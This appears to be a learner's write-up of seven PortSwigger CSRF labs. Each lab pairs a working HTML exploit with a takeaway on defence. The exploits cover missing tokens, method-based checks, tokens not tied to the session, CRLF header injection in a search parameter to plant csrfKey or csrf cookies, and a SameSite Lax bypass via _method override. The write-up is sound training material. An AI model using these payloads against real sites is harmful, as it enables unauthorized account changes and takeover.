## Lab 01: CSRF Vulnerability with No Defenses

This lab showed a basic CSRF vulnerability in the email change function.

The endpoint was:

```text
/my-account/change-email
```

It accepted a POST request with only an `email` parameter and did not require a CSRF token.

The exploit used an auto-submitting form:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-new@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

I first tested the exploit using **View exploit**, and it changed my own email.

Then I changed the email value and used **Deliver to victim**, which solved the lab.

### Key Takeaway

CSRF happens when a malicious page causes a logged-in user's browser to send an unwanted request.

If sensitive actions do not require a CSRF token, they can be triggered from another website.

## Lab 02: CSRF Where Token Validation Depends on Request Method

This lab showed a CSRF weakness caused by method-based validation.

The application checked the CSRF token when the email change request was sent as POST.

However, when the request was changed to GET, the token was not checked.

The exploit used a GET form:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-method@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Because the form had no `method` attribute, it submitted the request as GET.

### Key Takeaway

CSRF protection should not depend only on the request method.

Any request that changes data must require proper CSRF protection.


## Lab 03: CSRF Where Token Validation Depends on Token Being Present

This lab showed a CSRF flaw where the application only checked the CSRF token if it was present.

If the token value was wrong, the request was rejected.

But if the token parameter was removed completely, the request was accepted.

The exploit used a POST form without any CSRF token:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-missing@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

### Key Takeaway

A CSRF token must always be required for sensitive actions.

If the token is missing, the request should be rejected immediately.

## Lab 04: CSRF Where Token Is Not Tied to User Session

This lab showed a CSRF weakness where the token was valid but not linked to the user's session.

A secure CSRF token should only work with the session it was created for.

In this lab, a token from one account could be accepted in another user's request.

The exploit used a fresh unused CSRF token from my own account:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-session@test.com">
    <input type="hidden" name="csrf" value="FRESH-CSRF-TOKEN">
</form>

<script>
    document.forms[0].submit();
</script>
```

I copied the token from an intercepted request and dropped the request so the token would not be consumed.

Then I used the token in the exploit and delivered it to the victim.

### Key Takeaway

CSRF tokens must be tied to the user's session.

A valid token from one account should not work in another user's session.

## Lab 05: CSRF Where Token Is Tied to Non-Session Cookie

This lab showed a CSRF weakness where the token was tied to a separate cookie called `csrfKey`, not to the user's session.

The application accepted the request when:

```text
csrf token matches csrfKey cookie
```

But it did not properly check whether they belonged to the current logged-in user.

The exploit used two parts:

```text
1. Set the victim's csrfKey cookie.
2. Submit the email change form with the matching csrf token.
```

The exploit was:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-final-test@test.com">
    <input type="hidden" name="csrf" value="PASTE-CSRF-TOKEN-HERE">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=PASTE-CSRFKEY-HERE%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

The image request planted the `csrfKey` cookie.

Then `onerror` submitted the form automatically.

### Key Takeaway

A CSRF token should be tied to the user's session.

If the token is only tied to a separate cookie, an attacker may be able to plant that cookie and reuse a valid token.

## Lab 06: CSRF Where Token Is Duplicated in Cookie

This lab showed a weakness in the double submit cookie CSRF defense.

The application accepted the request when:

```text
csrf cookie value = csrf form value
```

The exploit used the same attacker-controlled value in both places:

```text
csrf=fake
```

The exploit was:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-duplicate-test@test.com">
    <input type="hidden" name="csrf" value="fake">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

The image request planted the `csrf=fake` cookie.

Then `onerror` submitted the form with the same `csrf=fake` value.

### Key Takeaway

Double submit cookie protection is not safe if the attacker can set or control the CSRF cookie.

A CSRF token should be tied to the user's session, not only compared with a cookie value.

## Lab 07: SameSite Lax Bypass via Method Override

This lab showed how SameSite Lax can be bypassed using method override.

SameSite Lax blocks cookies on cross-site POST requests, but it allows cookies on top-level GET navigation.

The exploit used:

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=victim-samesite%40test.com&_method=POST";
</script>
```

The request was sent as a GET request, so the session cookie was included.

Then the server used:

```text
_method=POST
```

and treated the request like a POST request.

### Key Takeaway

SameSite Lax is not enough if the application allows state-changing actions through GET requests or method override.
